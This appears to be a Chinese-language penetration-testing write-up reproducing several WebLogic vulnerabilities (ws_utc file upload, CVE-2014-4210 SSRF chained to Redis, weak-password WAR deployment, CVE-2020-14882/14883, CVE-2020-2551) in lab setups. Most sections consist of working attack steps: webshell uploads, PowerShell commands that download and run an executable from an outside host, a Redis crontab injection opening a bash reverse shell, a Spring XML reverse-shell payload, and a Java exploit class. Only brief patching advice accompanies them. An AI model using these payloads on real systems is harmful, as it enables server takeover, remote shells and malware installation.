Weblogic Web Service Test Page 中有两个未授权页面，可以上传任意文件。但是有一定的限制，该页面在开发模式下存在，在生产模式下默认不开启，如果是生产模式，需要登陆后台进行勾选启动 web 服务测试页，如下图。

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDo7puLukPmt2RIm5Snqzh9zX2bibwKXcTibe6vRloibpvQUvf9icGWciaV2w/640?wx_fmt=png)image-20210813145148182

##### 影响版本

```
10.3.6
12.1.3
12.2.1.2
12.2.1.3
```

##### 验证漏洞

测试页有两个

```
/ws_utc/config.do
/ws_utc/begin.do
```

##### 漏洞复现

这里要注意的是 12 版本，以前以及现在的默认安装是 “开发模式”，“生产模式” 下没有这两处上传点。如果是生产模式，需要登陆后台进行如下配置：（开发环境下不需要！！）

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDfbXia1XY0XvKyicyIcVem1tytBVW19X9fpqhICrSQknfyp8JVN8tSejg/640?wx_fmt=png)image-20210814171049349![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDSOruBz73vUmuPSCtcVMvibwRKeiaTdh6w7P2aeQay5PN31fcZXLek6yQ/640?wx_fmt=png)

勾选启用 web 服务测试项，保存重启 weblogic 即可

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDBU2D1Ep1p0bSn6xnpFCQJgGdpcqDFgSonjuHzadW5QovGPzJBnT43A/640?wx_fmt=png)

> 1. 测试 / ws_utc/config.do

访问 / ws_utc/config.do 页面，首先设置一下路径，设置 Work Home Dir 为 ws_utc 应用的静态文件 css 目录，因为默认上传目录不在 Web 目录无法执行 webshell，这里设置为：(css 访问不需要任何权限)

```
C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\com.oracle.webservices.wls.ws-testclient-app-wls_12.1.3\cmprq0\war\css
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDWgjd2vhFbPOZNefuSbNC3NX9AHZOKXrtjA5bCuHoXnibrv8iavAmhW8A/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaD3Dx6FTwLl1r2FVTKMveO7VXa9pNjvIQfExWwTQhFC3nLWGLL6y3XYg/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDic4PdZCOQuffrf5GbYOian7NtABumViaIicE3icwquk8Vk4ZwYRAjHNmBaQ/640?wx_fmt=png)image-20210813152013436

提交后，点击左边安全 -> 添加，上传 jsp 大马

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDhpLzqtTaJVKXGLUpP7dLeQxIv0zFFyVbpvZZCKXf4VTYnibSI4Ezuvw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDetH2nlnS0ic6E1UugzeM6MZibWSoO7icaQ6GwBxoLibnVsg29kdRNKzYxg/640?wx_fmt=png)

获取文件 id：1628933663766

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDJIfHcv8vwWCibMb8n4cQicmH9Uyy4oRUqkm3gmbSOI06MkL3XlIXkg0g/640?wx_fmt=png)

访问 url：

```
http://192.168.0.105/:7001/ws_utc/css/config/keystore/{时间戳}_{文件名}
http://192.168.0.105:7001/ws_utc/css/config/keystore/1628933663766_JspSpy.jsp
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDWSCcWJqhibHyFLFWqewWOqxbATmgiaqjS7c13Zxp3TFmMEshVnvyYHng/640?wx_fmt=png)image-20210814173547786

输入密码

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDeBbvSKCHqRDn0ZDYRFic0pb8EHvf8SxkFbcSC9ZEX6WwDog3EQOGzxA/640?wx_fmt=png)image-20210814173903964![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDNYuBUDbkYricDGia8gUOd16MagfAYQ2ibPXR4SxicL7z8J2t6HbiaQyKibPw/640?wx_fmt=png)image-20210814174004800

可以看见成功上线，同样方法也可以上传一句话或者其他木马。

> 2. 测试 /ws_utc/begin.do

大致方法和上面的 url 一样，这里需要注意的是

```
1./ws_utc/begin.do使用的工作目录是在/ws_utc/config.do中设置的Work Home Dir；
2.利用需要知道部署应用的web目录；
3.在生产模式下不开启，后台开启后，需要认证。
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaD21m52QvLlIBZ7QzGBFyo4AoRqs2w5kbh2vcmnahqI6dficsvhjRwHBQ/640?wx_fmt=png)image-20210814175127172image-20210814175507654![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDIYnsQuIbBtQY2PYJmC1faSTpZVOAC0DQ0KVBicX0jrHjTFGlPkTCwTA/640?wx_fmt=png)image-20210814180116136

报错可以忽略，返回包中已有文件路径

```
/css/upload/RS_Upload_2021-08-14_17-59-33_143/import_file_name_zcccmd.jsp
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDCzSk8t9C6rBcB5Jhj4KLXcxdMlfJiaUqtmYhxicLqLw0knshpn7lVwuA/640?wx_fmt=png)image-20210814180054350

访问路径，成功访问，powershell 上线 cs

```
http://192.168.0.105:7001/ws_utc/css/upload/RS_Upload_2021-08-14_17-59-33_143/import_file_name_zcccmd.jsp
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDxTjRT2NXXKibUySUqE6sfCubr5TRo8AsiaoWeXAib3J24f9sEIxqs6Mvg/640?wx_fmt=png)

```
powershell -Command (new-object System.Net.WebClient).DownloadFile('http://192.168.0.108/zcc.exe','zcc.exe');start-process zcc.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDXlYnIkq7HP7VTJlIadZ0CD3ibRnt2Cfc0e6T5s51OT6iaPYhAHiaIEHIw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaD6Whpvssyr20o2ibVe8gdDialYqeyFQOT3U6peb9KYRQ6gytCvmvsq6VQ/640?wx_fmt=png)image-20210814181718937

##### 安全防护

1. 启动生产模式后 Config.do 页面登录授权后才可访问

2. 升级到最新版本，目前生产模式下已取消这两处上传文件的地方。

#### 6.Weblogic SSRF 漏洞（CVE-2014-4210）

##### 漏洞简介

Oracle WebLogic Web Server 既可以被外部主机访问，同时也允许访问内部主机。比如有一个 jsp 页面 SearchPublicReqistries.jsp，我们可以利用它进行攻击，未经授权通过 weblogic server 连接任意主机的任意 TCP 端口，可以能冗长的响应来推断在此端口上是否有服务在监听此端口，进而攻击内网中 redis、fastcgi 等脆弱组件。

##### 影响版本

```
10.0.2.0
10.3.6.0
```

##### 验证漏洞

访问该路径，如果能正常访问，说明存在该漏洞

```
/uddiexplorer/SearchPublicRegistries.jsp
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDcUEH9ibcD5oZ1KAFH6egKOfrUWBmGp2Dr6eQTfYOFu99Tbca0AS00aA/640?wx_fmt=png)image-20210814185115833

##### 漏洞复现

这里复现用的 vulhub 靶场环境

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaD1rUSXopYuIUI64u79lTDG63p41fQMLicmkYn9HoASoQXFzkdpVOZzBw/640?wx_fmt=png)

抓包，在 url 后跟端口, 把 url 修改为自己搭建的服务器地址, 访问开放的 7001 端口

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaD7rxw6o2zR1QcNxuBvQ4KE2trha3azOrcmMibY4tYjLrQnZdRQUia2g6A/640?wx_fmt=png)image-20210814192248494![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDGqCylOfkVEMtEicCNXGRgUosxic1wyBSIAZkmApeFI7ks2YMWdwaSKWw/640?wx_fmt=png)image-20210814192515111

发现返回如下信息，说明开放 7001 端口，但是不是 http 协议

```
An error has occurred<BR>weblogic.uddi.client.structures.exception.XML_SoapException: The server at http://127.0.0.1:7001 returned a 404 error code (Not Found).  Please ensure that your URL is correct, and the web service has deployed without error.
```

image-20210814192706701

访问未开放的端口，会返回下面的信息

```
An error has occurred<BR>weblogic.uddi.client.structures.exception.XML_SoapException: Tried all: '1' addresses, but could not connect over HTTP to server: '127.0.0.1', port: '7002'
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDBorkfevUyLJdFkT5WZWX6kxibjPEJ7u2jOPD8kp77pjzj38O2UtuwtA/640?wx_fmt=png)image-20210814193417626

访问存在的端口，且为 http 协议时返回如下

```
An error has occurred<BR>weblogic.uddi.client.structures.exception.XML_SoapException: Received a response from url: http://192.168.0.108:80 which did not have a valid SOAP content-type: text/html.
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDWC4QibulvziajA23DhUYkVWvu5O12K7sK0gDVnwXWoO859ZDEF8oEDMg/640?wx_fmt=png)image-20210814203203147

#### 7.weblogic SSRF 联动 Redis

##### 漏洞复现

依旧用的上面这个靶场

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDHPB3TwHpPDPibO6nTDelAXpbdRBWP4TYDQIgcdPywl9gEib4LgFuJb3g/640?wx_fmt=png)image-20210814204005054

这里查一下开启 redis 服务的这个容器 IP，找到 ip：172.20.0.2

```
docker inspect a5a
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDQOlnFbS3Y60ElArQZjDz4xeAs2ooiatGyY0pPy0eKYcy7WD6uSQqsSQ/640?wx_fmt=png)image-20210814204200558

可以看见 6379 的端口存在，且为 http 协议

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDmicYcQETRtXtP2jSfZWpeoR0as2TedVuhgOP8wuBXqrZ0JDTtxs1blQ/640?wx_fmt=png)image-20210814204413085

本机监听 12345 端口

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDk7xZUlonvOHWtd5lAH7SXdabPVtZndREa2wWzNSh4LYjWHOHlBgcMA/640?wx_fmt=png)image-20210814204756777

burp 改包直接将弹 shell 脚本到本机 kail 上（192.168.0.104）

```
set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/192.168.0.104/12345 0>&1\n\n\n\n"config set dir /etc/config set dbfilename crontabsave
```

经过 url 编码后，写入 bp 中 operator 参数的后面:

```
operator=http://172.20.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.104%2F12345%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDuEx3P5wqcYuquWW7hY8DbtgKyJEZ8jKnDD7frDKTLAtIyeNyicVuYTA/640?wx_fmt=png)image-20210814210942824![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDAZFPNGxR4twjqlEJUIK4Vj0iaicWClutsvOSJ6rM7enSvSMco2grxDsg/640?wx_fmt=png)image-20210814211117689

反弹 shell 成功。

##### 安全防护

升级高版本。

#### 8.Weblogic 弱口令 && 后台 getshell

##### 漏洞简介

由于管理员的安全意识不强，或者配置时存在疏忽，会导致后台存在弱口令或者默认的用户名 / 口令。

#### 影响版本

全版本

#### 漏洞复现

通过弱口令登录管理台后，点击部署 -> 安装

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDvctz5rfd6BfxibWyeEhIXNAgQbQuPxgOjicVVPAYFiapH4xc9ibD23ZklA/640?wx_fmt=png)image-20210814212040819![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaD11awxcWo4icAfVdXxrKbE845QXaia8HNmiaLwldXRHrwq5tvfSb7B5f7g/640?wx_fmt=png)image-20210814212434754![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDGfQUI0ibLP0qdgf6Miaiau4NUicrb79qKzj3S527MANUUlzxTa49MHAtbg/640?wx_fmt=png)image-20210814212521338

这里 war 包成功上传

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDLgeZ251korgAMDdfBmooQEwcBYt3niceHMDAf8SPVM8yRCpbibzqSzrQ/640?wx_fmt=png)image-20210814212645817

将其作为应用程序安装

image-20210814212857889![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDL7nNjYX6VyFgiaqHuclhb2rWcqEjws0hJG07TfiapbicMfey7BibJ8h9Rw/640?wx_fmt=png)image-20210814212917962

点击完成。

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDHrST3oZypicPCcNFqNs4XrqSBfA5NXjHxnhCttYMriaDt2NCw8K44jSw/640?wx_fmt=png)image-20210814213012827

可以看见部署成功，访问 url

```
http://192.168.0.105:7001/zcc/JspSpy.jsp
```

image-20210814214222692

输入密码，即可成功拿到 webshell

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDMmeqbW77PiaDWeWXln9xPDLweWgXc0ialhI5KEibdVxVqmPciaoX16WZuw/640?wx_fmt=png)image-20210814214304327

#### 安全防护

避免出现弱口令

#### 9.Weblogic Console HTTP 协议远程代码执行漏洞 (CVE-2020-14882/CVE-2020-14883)

##### 漏洞简介

未经身份验证的远程攻击者可能通过构造特殊的 HTTP GET 请求，利用该漏洞在受影响的 WebLogic Server 上执行任意代码。它们均存在于 WebLogic 的 Console 控制台组件中。此组件为 WebLogic 全版本默认自带组件，且该漏洞通过 HTTP 协议进行利用。将 CVE-2020-14882 和 CVE-2020-14883 进行组合利用后，远程且未经授权的攻击者可以直接在服务端执行任意代码，获取系统权限。

##### 影响版本

```
10.3.6.0
12.1.3.0
12.2.1.3
12.2.1.4
14.1.1.0
```

##### 漏洞复现

CVE-2020-14883: 权限绕过漏洞的 poc：

```
http://192.168.0.105:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=AppDeploymentsControlPage&handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29
```

访问该 url 之后，进入如下页面，可以看见成功进入管理台：

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDCUib7D6ib0vCRhxwb9yVImib8CqnZCl20FNe52Ymghic8ib2I96Og0icXp4w/640?wx_fmt=png)image-20210814220636352

CVE-2020-14882: 代码执行漏洞的 poc：

```
http://192.168.0.106:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch /tmp/zcc123%27);%22);
```

这里复现用的 vulhub 靶场

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaD12d5zdH2REtiaOGnnoowIicES5udCeO12QHk4P2ovnw6PTmLiagaOIcRA/640?wx_fmt=png)image-20210814222333621

访问报 404，不要慌，此时去容器中看会发现文件已成功写入；

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDXusXic2r4qy1uRnDMWybPnxt8ricWgD7cCnL80EuYeqiaECJKviaba1Wfw/640?wx_fmt=png)image-20210814221311713![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaD9pnbywPiaFcHYuqKoAdLCiaQZA41kV1Xq1lJ1V0AZJ6QibhGFf5yemCCg/640?wx_fmt=png)

这里执行反弹 shell 的 xml 文件 poc.xml：

```
## poc.xml<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">    <constructor-arg>      <list>        <value>/bin/bash</value>        <value>-c</value>        <value><![CDATA[bash -i >& /dev/tcp/192.168.0.104/6669 0>&1]]></value>      </list>    </constructor-arg>  </bean></beans>
```

把 poc.xml 放在打开 http 服务的 kali 机子上 (ip:192.168.0.108)：

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaD2jtBrydgDeML2VquEiaPR1VQvo4TEth2aibiawJjVw6IqcusNNMOytJqQ/640?wx_fmt=png)

在监听机子上开启监听：

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDV8UPbSWicoo1FNTWoMUmwWTNia6ITiaBUBrPsvWYyEj14pJPJ0wheIficw/640?wx_fmt=png)image-20210814223442393

然后访问该 url：

```
http://192.168.0.106:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://192.168.0.108/poc.xml")
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDBSZgA24icpRSZ6LvR3Ucia9afmF9HKNYz1fEzFeBee7Q1J9RSnnicJOVQ/640?wx_fmt=png)image-20210814224224450

同理，上线 cs 的话把反弹的命令改了即可。

##### 安全防护

升级官方补丁：https://www.oracle.com/security-alerts/cpuoct2020.html

#### 10.IIOP 反序列化漏洞（CVE-2020-2551）

##### 漏洞简介

2020 年 1 月 15 日，Oracle 官方发布 2020 年 1 月关键补丁更新公告 CPU（CriticalPatch Update），其中 CVE-2020-2551 的漏洞，漏洞等级为高危，CVVS 评分为 9.8 分，漏洞利用难度低。IIOP 反序列化漏洞影响的协议为 IIOP 协议，该漏洞是由于调用远程对象的实现存在缺陷，导致序列化对象可以任意构造，在使用之前未经安全检查，攻击者可以通过 IIOP 协议远程访问 Weblogic Server 服务器上的远程接口，传入恶意数据，从而获取服务器权限并在未授权情况下远程执行任意代码.

##### 影响版本

```
10.3.6.0
12.1.3.0
12.2.1.3
12.2.1.4
```

##### 漏洞复现

需要安装 java8 环境

```
cd /optcurl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gztar zxvf jdk-8u20-linux-x64.tar.gzrm -rf /usr/bin/java*ln -s /opt/jdk1.8.0_20/bin/j* /usr/binjavac -versionjava -version
```

这里我已经安装好

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaD87jiatpI5gNTiasDkAA0U5TwT1diaicNbFcTbibYh4x4c1IeiaiajiaQY4yFbw/640?wx_fmt=png)image-20210814225849356

exp.java 代码

```
import java.io.IOException;public class exp { static{  try {   java.lang.Runtime.getRuntime().exec(new String[]{"cmd","/c","calc"});  } catch (IOException e) {   e.printStackTrace();  } } public static void main(String[] args) {   }}
```

image-20210814230308993

java 编译 exp.java

```
javac exp.java -source 1.6 -target 1.6
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDhXicNS9zVib9S0M0GndHSOp2my1Y29sUxm1GTiaHUfpFJ82VNERQdmbxw/640?wx_fmt=png)image-20210814230430269

接着 python 开启 http 服务, 与 exp.class 在同一文件夹即可

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDG2jMJgoZXwM40zjM2EY5MR1v7wMLIp44mF5ymoNy0ETrRCdjOpVIRw/640?wx_fmt=png)image-20210814230710705

使用 marshalsec 启动一个 rmi 服务

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.0.108/#exp" 12345
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDsQibMOoa34rg2Rw0YJ7pbkZAgd366W3e0Lv3ddCzY0uYY0wpX8Sicib8g/640?wx_fmt=png)image-20210814230935474

使用工具 weblogic_CVE_2020_2551.jar，执行 exp

```
java -jar weblogic_CVE_2020_2551.jar 192.168.0.105 7001 rmi://192.168.0.108:12345/exp
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDBO6lialIXibTViaW9BSSoEyPSnUc23VOQov37iavbrcRCicdY27Mpz213Dg/640?wx_fmt=png)image-20210814231847184

可以看见成功弹出

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDAgsSxYqVb247ovj7uKsIVPX6ibsyZ0icC4p4ibya4boD1kKWWZxN3kHrg/640?wx_fmt=png)image-20210814231822800

同理，上线 cs 的话，只需改 exp.java 代码即可，后续步骤一样

```
import java.io.IOException;public class exp { static{  try {   java.lang.Runtime.getRuntime().exec(new String[]{"powershell","/c"," (new-object System.Net.WebClient).DownloadFile('http://x.x.x.x/zcc.exe','zcc.exe');start-process zcc.exe"});  } catch (IOException e) {   e.printStackTrace();  } } public static void main(String[] args) {   }}
```

##### 安全防护

使用官方补丁进行修复：https://www.oracle.com/security-alerts/cpujan2020.html

欢迎关注亿人安全！

公众号